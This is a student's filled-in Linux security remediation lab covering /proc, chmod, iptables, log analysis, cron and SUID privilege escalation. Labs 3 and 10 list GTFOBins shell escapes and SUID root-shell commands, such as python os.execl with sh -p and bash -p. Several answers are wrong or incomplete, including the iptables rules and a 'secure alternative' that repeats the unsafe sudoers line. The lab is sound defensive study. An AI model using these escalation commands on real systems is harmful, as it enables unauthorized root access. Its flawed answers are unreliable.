# Week 4 Remediation Lab Exercises

**Candidate:** Tanveer Salim (fosres)

**Purpose:** Targeted practice for deficiencies identified in the Week 4 Linux Internals Lab Assessment

**Sources:**
- Complete 48-Week Security Engineering Curriculum, Pages 13-14
- HackTricks Linux Privilege Escalation (book.hacktricks.xyz)
- Grace Nolan's Security Engineering Notes (github.com/gracenolan/Notes)
- GTFOBins (gtfobins.github.io)

---

## Lab 1: /proc Filesystem Mastery

**Deficiency:** Used `ps` commands instead of `/proc` filesystem for process investigation.

**Setup:**
```bash
# Start a background process to investigate
sleep 3600 &
export TARGET_PID=$!
echo "Your target PID is: $TARGET_PID"
```

### Exercise 1.1: Binary Path Discovery

**Task:** Using ONLY the `/proc` filesystem (no `ps`, `pwdx`, or other commands), find the absolute path to the executable for your target process.

```
readlink /proc/21090/exe
```

### Exercise 1.2: Environment Variables

**Task:** View the environment variables that the process was started with. The output will be null-separated — pipe it through a command to make it readable (one variable per line).

```
cat /proc/21090/environ
```

### Exercise 1.3: Current Working Directory

**Task:** Using `/proc`, determine the current working directory of the process.

```
ls -l /proc/21090/cwd 
```

### Exercise 1.4: File Descriptors

**Task:** List all open file descriptors for the process and explain what file descriptors 0, 1, and 2 typically represent.

Here is the command to list all open file descriptors:

```
ls -la /proc/21090/fd/
```

FD 0: stdin: accepts input from user

FD 1: stdout: text output printed to console

FD 2: stderr: error messages printed to console

Below are the all the open file descriptors for the process:

```
$ls -la /proc/21090/fd/
total 0
dr-x------ 2 fosres fosres  0 Jan  7 13:25 ./
dr-xr-xr-x 9 fosres fosres  0 Jan  7 13:24 ../
lr-x------ 1 fosres fosres 64 Jan  7 13:25 0 -> /dev/null
l-wx------ 1 fosres fosres 64 Jan  7 13:25 1 -> 'pipe:[544003]'
lrwx------ 1 fosres fosres 64 Jan  7 13:25 2 -> /dev/pts/3
lr-x------ 1 fosres fosres 64 Jan  7 13:25 50 -> anon_inode:inotify
```

### Exercise 1.5: Memory Maps

**Task:** View the memory mappings of the process. Identify which shared libraries the process has loaded.

View Memory Mappings:

```
cat /proc/21090/maps
```
To view shared libraries:

```
awk '$NF!~/\.so/{next} {$0=$NF} !a[$0]++' /proc/21090/maps
```

List 3 shared libraries you see:

I only see two. Here is the output of the above command:

```
/usr/lib/x86_64-linux-gnu/libc.so.6
/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

### Exercise 1.6: Process Status

**Task:** Read the process status file and extract the following information:
- Process state
- Parent PID
- UID and GID
- Number of threads

Process State:

```
$cat /proc/21090/status | grep -i State

State:  S (sleeping)
```

```
$cat /proc/21090/status | grep -i PPID

PPID: 1329
```

UID:

```
$cat /proc/21090/status | grep -i UID
Uid:    1000    1000    1000    1000
```

GID:

```
$cat /proc/21090/status | grep Gid

Gid:    1000    1000    1000    1000
```
Threads:

```
$cat /proc/21090/status | grep Thread

Threads:        1
```

### Exercise 1.7: Command Line Arguments

**Task:** View the exact command line that was used to start the process.

```
$cat /proc/21090/cmdline
sleep3600
```
---

## Lab 2: chmod Symbolic Notation

**Deficiency:** Only provided octal notation; missing symbolic notation.

**Setup:**
```bash
mkdir -p ~/chmod_lab
cd ~/chmod_lab
touch file1.txt file2.txt file3.txt file4.txt file5.txt
```

### Exercise 2.1: Basic Symbolic Permissions

**Task:** Set the following permissions using SYMBOLIC notation only (no octal):

| File | Owner | Group | Others |
|------|-------|-------|--------|
| file1.txt | rwx | r-x | r-- |
| file2.txt | rw- | r-- | --- |
| file3.txt | rwx | rwx | rwx |
| file4.txt | r-- | --- | --- |
| file5.txt | rw- | rw- | r-- |


```
chmod u=rwx,g=rx,o=r file1.txt
chmod u=rw,g=r,o= file2.txt
chmod u=rwx,g=rwx,o=rwx file2.txt
chmod u=rwx,g=rwx,o=rwx file3.txt
chmod u=r,g=,o= file4.txt
chmod u=rw,g=rw,o=r file5.txt
```


### Exercise 2.2: Symbolic Modification

**Task:** Using symbolic notation, perform these modifications:

```bash
# Reset all files to 644 first
chmod 644 file*.txt
```

a) Add execute permission for owner only on file1.txt
```
Your Command:

chmod u+x file1.txt
```

b) Remove read permission for others on file2.txt
```
Your Command:

chmod o-r file2.txt

```

c) Add write permission for group on file3.txt
```
Your Command:

chmod g+w file3.txt
```

d) Set owner to read-only, remove all permissions from group and others on file4.txt
```
Your Command:

chmod u-w file4.txt
chmod go-r file4.txt
```

e) Add execute for everyone on file5.txt
```
Your Command:

chmod ugo+x file5.txt
```

### Exercise 2.3: Conversion Challenge

**Task:** Convert these octal permissions to symbolic notation commands:

| Octal | Symbolic Command |
|-------|------------------|
| 755 | chmod ________________ |
| 640 | chmod ________________ |
| 600 | chmod ________________ |
| 444 | chmod ________________ |
| 711 | chmod ________________ |

Octal: 755 | Symbolic: chmod u=rwx,g=rx,o=rx
Octal: 640 | Symbolic: chmod u=rw,g=r,o=
Octal: 600 | Symbolic: chmod u=rw,g=,o=
Octal: 444 | Symbolic: chmod u=r,g=r,o=r
Octal: 711 | Symbolic: chmod u=rwx,g=x,o=x

---

## Lab 3: Vim Privilege Escalation (GTFOBins)

**Deficiency:** Missed the critical vim shell escape vulnerability.

**READ FIRST:** This lab teaches you attack techniques for DEFENSIVE purposes — understanding how attackers exploit misconfigurations helps you prevent them.

### Exercise 3.1: Understanding the Vulnerability

**Task:** Explain why this sudoers entry is dangerous:

```
webadmin ALL=(ALL) NOPASSWD: /usr/bin/vim /var/log/apache2/*
```

Your Explanation (must include how to spawn a shell):

An attacker can first execute:

1. `sudo vim`

2. Attacker can next spawn a shell in vim

### Exercise 3.2: Vim Shell Escapes

**Task:** List FOUR different ways to spawn a shell from within vim:

```
Method 1:

`:!bash`

Method 2:

`:shell`

Method 3:

`:sh`

Method 4:

`:terminal`

### Exercise 3.3: Other Dangerous Editors

**Task:** Research GTFOBins and list shell escape methods for these editors:

nano:

```
^R^X
reset; sh 1>&0 2>&0
```

less:

```
less /etc/profile
!/bin/sh
```

more:

```
TERM= more /etc/profile
!/bin/sh
```

man:

```
man man
!/bin/sh
```

### Exercise 3.4: Secure Alternatives

**Task:** For each dangerous sudoers entry, provide a secure alternative:

a) `user ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/nginx/*`

Secure Alternative:

```

`user ALL=(ALL) NOPASSWD: sudoedit /etc/nginx/*`

```

b) `user ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/*`

Secure Alternative:


```
b) `user ALL=(ALL) NOPASSWD: /usr/bin/cat /var/log/*`

```

c) `user ALL=(ALL) NOPASSWD: /usr/bin/find /tmp`
```
Why is this dangerous?

The `find` command can be abused to launch a shell:

```
find . -exec /bin/sh \; -quit
```
Secure Alternative:

```
user ALL=(ALL) NOPASSWD: /usr/bin/find /tmp
```

Secure Alternative:

```
user ALL=(ALL) NOPASSWD: /usr/bin/find /tmp
```


### Exercise 3.5: GTFOBins SUID Exploitation

**Task:** For each binary, explain how it could be exploited if it has SUID bit set:

GTFOBins says the following about SUID binaries:

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.


/usr/bin/python3 (with SUID):


Here is a sample exploit that can be done with `python3`:

This example creates a local SUID copy of the binary and runs it to
maintain elevated privileges. To interact with an existing SUID binary
skip the first command and run the program using its original path:


```
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
/usr/bin/env /bin/sh
```

This example creates a local SUID copy of the binary and runs it to
maintain elevated privileges. To interact with an existing SUID binary
skip the first command and run the program using its original path:

```
sudo install -m =xs $(which env) .

./env /bin/sh -p
```

/usr/bin/awk (with SUID):

This example creates a local SUID copy of the binary and runs it to
maintain elevated privileges. To interact with an existing SUID binary
skip the first command and run the program using its original path:

```
sudo install -m =xs $(which awk) .

LFILE=file_to_read
./awk '//' "$LFILE"
```

/usr/bin/cp (with SUID):

This example creates a local SUID copy of the binary and runs it to
maintain elevated privileges. To interact with an existing SUID binary
skip the first command and run the program using its original path:

a)

```
sudo install -m =xs $(which cp) .

LFILE=file_to_write
echo "DATA" | ./cp /dev/stdin "$LFILE"
```

b)

This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of cp has the --parents option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)

```
sudo install -m =xs $(which cp) .

LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./cp $TF $LFILE
```

c)

This can copy SUID permissions from any SUID binary (e.g., cp itself) to
another:


```
sudo install -m =xs $(which cp) .

LFILE=file_to_change
./cp --attributes-only --preserve=all ./cp "$LFILE"
```

---

## Lab 4: Timestamp Forensics

**Deficiency:** Missing timestamp manipulation detection techniques.

**Setup:**
```bash
mkdir -p ~/forensics_lab
cd ~/forensics_lab
echo "original content" > evidence.txt
sleep 2
```

### Exercise 4.1: View All Timestamps

**Task:** Use the `stat` command to view all three timestamps (atime, mtime, ctime) for evidence.txt.

```
Access: 2026-01-07 19:08:32.656122106 -0800
Modify: 2026-01-07 19:08:32.656122106 -0800
Change: 2026-01-07 19:08:32.656122106 -0800
```

### Exercise 4.2: Timestamp Manipulation

**Task:** Use `touch` to set the mtime of evidence.txt to January 1, 2020 at 12:00:00.

```
touch -d "Wed, January 1 2020 12:00:00" evidence.txt
```

### Exercise 4.3: Detecting Manipulation

**Task:** After running the touch command above, run `stat` again. Explain how you can tell the timestamps were manipulated.

Your stat output:

```
Device: 254,1   Inode: 24379420    Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/  fosres)   Gid: ( 1000/  fosres)
Access: 2020-01-01 12:00:00.000000000 -0800
Modify: 2020-01-01 12:00:00.000000000 -0800
Change: 2026-01-07 19:19:57.853855614 -0800
 Birth: 2026-01-07 19:08:32.656122106 -0800
```

We can see from the "Modify" time that the datetime is:

```
12:00:00.000000000
```

How can you tell manipulation occurred?


We can tell because the timestamp for "Modified" is different

than the previous and it correctly says the modified datetime

is: `2020-01-01 12:00:00.000000000 -0800`.


### Exercise 4.4: The Ctime Principle

**Task:** Explain why ctime cannot be easily faked by an attacker (without filesystem-level access).

NOTE: Claude you gave me the answer to this you don't have to give

me credit this time:

`ctime` is managed by the kernel not userspace. So there is no

userspace command like `touch` that would allow an attacker to

modify it.


### Exercise 4.5: Forensic Detection Script

**Task:** Write a bash one-liner that finds files where mtime is OLDER than ctime (indicating possible timestamp manipulation):

Claude we agreed this question is oddly specific and unlikely to

appear on the interview. Instead just recognize that if the mtime

is older than ctime that looks suspicious as it might indicate an

attacker is trying hide corrupting edits to a file (its actually

possible an authentic user changed file permissions too). So below is the answer

you provided:

```
find /var/log -type f -exec stat --format='%Y %Z %n' {} \; | awk '$1 < $2 {print $3}'
```

### Exercise 4.6: Real-World Scenario

**Scenario:** You find a file with these timestamps:
```
Access: 2025-01-05 10:30:00
Modify: 2024-06-15 08:00:00
Change: 2025-01-05 10:35:00
```

**Task:** Is this file suspicious? Explain your reasoning.

```
Potentially yes: the mtime is older than ctime--its possible

an attacker modified its contents and is trying to hide that.
```

---

## Lab 5: iptables Syntax Mastery

**Deficiency:** Confused source restrictions with open access rules.

### Exercise 5.1: Rule Analysis

**Task:** Explain what each of these rules does:

```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

Explanation:

Above rule allows all incoming traffic to destination port 22

on machine inspecting packet


```bash
iptables -A INPUT -p tcp -s 10.0.0.0/24 --dport 22 -j ACCEPT
```

```
Explanation:

Above rule allows all packets sent by machines that are part of

the `10.0.0.0/24` subnet to port 22 on machine inspecting packet.
```

```bash
iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT
```

Explanation:

Above rule allows all packets sent by machine with private IP

address 192.168.1.100 to destination port 22 on machine inspecting

packet.

### Exercise 5.2: Write the Rules

**Task:** Write iptables rules for these requirements:

a) Allow SSH from anywhere
Your Rule:

```
iptables -A INPUT -s 0.0.0.0/0 --dport 22 -j ACCEPT
```

b) Allow SSH only from 172.16.0.0/16

```
iptables -A INPUT -p tcp -s 172.16.0.0/16 --dport 22 -j ACCEPT
```

c) Allow HTTP from anywhere
Your Rule:

```
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```

d) Allow HTTPS only from 10.10.10.0/24

Your Rule:

```
iptables -A INPUT -s 10.10.10.0/24 -j ACCEPT
```

e) Allow MySQL (3306) only from localhost

Your Rule:

```
iptables -A INPUT -p tcp --dport 3306 -j ACCEPT
```

### Exercise 5.3: Complete Firewall Script

**Task:** Write a complete iptables script for a web server that:
- Allows SSH (22) only from 10.0.0.0/8
- Allows HTTP (80) from anywhere
- Allows HTTPS (443) from anywhere
- Allows established/related connections
- Drops all other incoming traffic
- Allows all outgoing traffic

```
iptables -P INPUT DROP
iptables -P OUTPUT ALLOW
iptables -P FORWARD DROP
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp -s 10.0.0.0/8  --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT DROP
```





# Save rules (Debian/Ubuntu)
# iptables-save > /etc/iptables/rules.v4
```

### Exercise 5.4: DROP vs REJECT

**Task:** Explain the security trade-offs:

```
When would you use DROP?

In general use DROP when you don't want the sender of the packet

to know the packet was denied. For example this can make the port look

unoccupied leaving port scanners confused on whether it is open. This

can ward off potential attackers.



When would you use REJECT?

Use reject when you want the sender to know the connection request

is not allowed. 

Which is generally preferred for external-facing firewalls and why?


DROP is preferred because such a firewall is open to the entire world

inviting attackers. Best to ignore unauthorized packets.

This will delay attackers from discovering vulnerable services.

---

## Lab 6: /etc/passwd Field Breakdown

**Deficiency:** Did not explain each field of /etc/passwd entries.

### Exercise 6.1: Field Identification

**Task:** Label each field in this /etc/passwd entry:

```
nginx:x:101:101:Nginx Web Server:/var/lib/nginx:/sbin/nologin
  │   │  │   │        │              │              │
  │   │  │   │        │              │              └─ Field 7: ____________
  │   │  │   │        │              └─ Field 6: ____________
  │   │  │   │        └─ Field 5: ____________
  │   │  │   └─ Field 4: ____________
  │   │  └─ Field 3: ____________
  │   └─ Field 2: ____________
  └─ Field 1: ____________
```

Field 1: Username

Field 2: `x` indicates password hash in `/etc/shadow`

Field 3: UID of username

Field 4: GID of username

Field 5: UID Info: Allows you to add extra info about users such as

user's full name, phone number, etc.

Field 6: Home Directory of username

Field 7: Command Shell username is given after login completes

### Exercise 6.2: Security Analysis

**Task:** Analyze these /etc/passwd entries and identify security concerns:


Entry 1:

```
admin:$6$rounds=5000$salt$hash:0:0:Admin:/root:/bin/bash
```

Security Concern:

1. `$6` means SHA-512 is being used as a password hashing algorithm.

One should use `$2a` (blowfish) or `$y` (yescrypt).


Entry 2:

backup:x:1001:1001:Backup User:/home/backup:/bin/bash

Security Concern (if any):

No security concerns found.

Entry 3:

```
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
```

Security Concern:

1. `mysql` should not need a complete BASH shell to operate.

Better to assign it the shell `usr/sbin/nologin`

### Exercise 6.3: Service Account Best Practices

**Task:** What shell should service accounts (like nginx, mysql, apache) have and why?

Recommended Shell:

Better to assign it the shell `usr/sbin/nologin`

Why:

There is no reason to allow these services from logging into a shell

and interacting with the system! That's a security risk.

Reference: https://www.dotlinux.net/blog/how-to-disable-user-login-with-linux-nologin/

---

## Lab 7: Log Analysis with grep/awk

**Deficiency:** Used `grep -c` instead of aggregating by IP address.

**Setup:** Create a sample auth.log:
```bash
mkdir -p ~/log_lab
cat > ~/log_lab/auth.log << 'EOF'
Jan 5 14:22:01 server sshd[4521]: Failed password for root from 45.33.32.156 port 52341
Jan 5 14:22:03 server sshd[4522]: Failed password for root from 45.33.32.156 port 52342
Jan 5 14:22:05 server sshd[4523]: Failed password for admin from 45.33.32.156 port 52343
Jan 5 14:22:07 server sshd[4524]: Failed password for root from 192.168.1.100 port 52344
Jan 5 14:22:09 server sshd[4525]: Failed password for ubuntu from 10.0.0.50 port 52345
Jan 5 14:22:11 server sshd[4526]: Failed password for root from 45.33.32.156 port 52346
Jan 5 14:22:13 server sshd[4527]: Failed password for admin from 10.0.0.50 port 52347
Jan 5 14:22:15 server sshd[4528]: Failed password for root from 45.33.32.156 port 52348
Jan 5 14:22:17 server sshd[4529]: Accepted password for admin from 192.168.1.1 port 52349
Jan 5 14:22:19 server sshd[4530]: Failed password for root from 45.33.32.156 port 52350
EOF
```

### Exercise 7.1: Count Total Failures

**Task:** Count the total number of failed password attempts.

```
$grep "Failed password" ~/log_lab/auth.log | wc -l
9
```



### Exercise 7.2: Count Failures by IP

**Task:** Count failed password attempts grouped by IP address, sorted by count (highest first).

```
Your Command:


Expected Output Format:
   6 45.33.32.156
   2 10.0.0.50
   1 192.168.1.100
```

### Exercise 7.3: Count Failures by Username

**Task:** Count failed password attempts grouped by username.

Your Command:

```
grep "Failed" ~/log_lab/auth.log  | awk '{print $(NF-2)}' | sort | uniq -c | sort -rn
```

### Exercise 7.4: Find Successful Logins

**Task:** List all successful login attempts with username and source IP.

```
grep "Accepted" ~/log_lab/auth.log | awk '{print $(NF-5), $(NF-3)}'
```

### Exercise 7.5: Advanced Analysis

**Task:** Find IPs with more than 3 failed attempts (potential brute-force attackers).

```
grep "Failed" ~/log_lab/auth.log | awk '{print $(NF-3)}' | sort | uniq
-c | sort -rn | awk '$1 > 3
```

### Exercise 7.6: Time-Based Analysis

**Task:** Extract just the timestamps and IPs of failed attempts, useful for timeline analysis.

Your Command:

```
grep "Failed" ~/log_lab/auth.log | awk '{print $1,$2,$3,$(NF-3)}'
```


```
Expected Output Format:
Jan 5 14:22:01 45.33.32.156
Jan 5 14:22:03 45.33.32.156
...
```

---

## Lab 8: find Command Mastery

**Deficiency:** Incorrect syntax for finding world-writable files.

### Exercise 8.1: Permission-Based Searches

**Task:** Write find commands for each:

a) Find all world-writable files in /var

```
find / -path /var -prune -o -perm -2 ! -type l -ls
```

b) Find all world-writable directories in /tmp

```
find / -path /tmp -prune -o -perm -2 ! -type l -ls
```

c) Find all SUID files on the system

```
find / -perm /4000
```

d) Find all SGID files on the system

```
find / -perm /2000
```

e) Find files with no owner

```
find / -nouser 2>/dev/null
```

f) Find files with no group

```
find / -nogroup 2>/dev/null
```

### Exercise 8.2: Time-Based Searches

**Task:** Write find commands for each:

a) Files modified in the last 24 hours in /etc

```
find /etc -mtime -1
```

b) Files modified in the last 7 days in /var/log

```
find /var/log -mtime -7
```

c) Files accessed in the last 1 hour

```
find / -amin -60
```

d) Files modified MORE than 30 days ago in /tmp

```
find /tmp -mtime +30 
```

### Exercise 8.3: Combined Searches

**Task:** Write find commands combining multiple criteria:

a) SUID files modified in the last 7 days

```
find / -perm 4000 -mtime -7
```

b) World-writable files owned by root

```
find / -type f -user root -perm -o=w 2>/dev/null
```

c) Files larger than 100MB modified in the last day

```
find / -type f -size +100MB -mtime -1
```

---

## Lab 9: Cron Job Enumeration

**Deficiency:** Did not provide comprehensive commands to list all cron jobs.

### Exercise 9.1: Current User Crontab

**Task:** View cron jobs for the current user.

```
crontab -l
```

### Exercise 9.2: Specific User Crontab

**Task:** View cron jobs for user "www-data" (requires sudo).

```
sudo crontab -u www-data -l
```

### Exercise 9.3: System Crontabs

**Task:** List commands to check ALL system cron locations:

```
Cron directories to check:
1. /etc/cron.d/
2. /etc/cron.hourly/
3. /etc/cron.daily/
4. /etc/cron.weekly/
5. /etc/cron.monthly/

```

### Exercise 9.4: All Users Script

**Task:** Write a script that lists cron jobs for ALL users on the system:

```bash
#!/bin/bash
# List all user crontabs

for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done
```

### Exercise 9.5: Anacron

**Task:** What is anacron and where is it configured?

What is anacron: This is a Linux command to execute other commands

periodically with a frequency specified in days. It is configured

in a file known as: `/etc/anacrontab`.



### Exercise 9.6: Suspicious Cron Detection

**Task:** List three red flags that would make a cron job suspicious:

1. Cron jobs running with root privileges

2. Commands using wildcards that can be exploited

3. Cronjobs missing absolute paths in commands

4. Cronjobs featuring SUID binaries

---

## Lab 10: SUID Privilege Escalation Techniques

**Deficiency:** Only described one general technique instead of three specific ones.

### Exercise 10.1: GTFOBins Research

**Task:** For each SUID binary, write the exact command to spawn a root shell:

```
/usr/bin/find (SUID):


sudo install -m =xs $(which find) .

./find . -exec /bin/sh -p \; -quit

/usr/bin/vim (SUID):

sudo install -m =xs $(which vim) .

./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

/usr/bin/python3 (SUID):

sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

/usr/bin/awk (SUID):

sudo install -m =xs $(which awk) .

LFILE=file_to_read
./awk '//' "$LFILE"

/usr/bin/nmap (old versions, SUID):

sudo install -m =xs $(which nmap) .

LFILE=file_to_write
./nmap -oG=$LFILE DATA

/usr/bin/bash (SUID):

sudo install -m =xs $(which bash) .

./bash -p

```

### Exercise 10.2: Detection Script

**Task:** Write a bash script that finds potentially dangerous SUID binaries by comparing against a known-good list:

```bash
#!/bin/bash
# Known safe SUID binaries
SAFE_SUIDS=(
    "/usr/bin/passwd"
    "/usr/bin/sudo"
    "/usr/bin/mount"
    "/usr/bin/umount"
    "/usr/bin/su"
    "/usr/bin/chsh"
    "/usr/bin/chfn"
    "/usr/bin/newgrp"
    "/usr/bin/gpasswd"
)

# Find all SUID binaries and flag unknown ones




```

### Exercise 10.3: Shared Library Attacks

**Task:** Explain how LD_PRELOAD can be used for privilege escalation with SUID binaries, and why it usually doesn't work:

```
How LD_PRELOAD attack works:



Why it usually fails with SUID:



When it CAN work:


```

### Exercise 10.4: Path Injection

**Task:** Explain how PATH injection can lead to privilege escalation with SUID binaries:

```
How the attack works:



Example vulnerable code pattern:



Mitigation:


```

---

## Submission Checklist

Complete all exercises and verify:

- [ ] Lab 1: All 7 /proc exercises completed
- [ ] Lab 2: All chmod symbolic notation exercises completed
- [ ] Lab 3: All vim/GTFOBins exercises completed
- [ ] Lab 4: All timestamp forensics exercises completed
- [ ] Lab 5: All iptables exercises completed
- [ ] Lab 6: All /etc/passwd exercises completed
- [ ] Lab 7: All log analysis exercises completed
- [ ] Lab 8: All find command exercises completed
- [ ] Lab 9: All cron enumeration exercises completed
- [ ] Lab 10: All SUID privilege escalation exercises completed

---

**Estimated Time:** 3-4 hours

**Resources Allowed:** Linux VM, man pages, GTFOBins (gtfobins.github.io)

**Goal:** Score 90%+ on these exercises before retaking the Week 4 assessment.
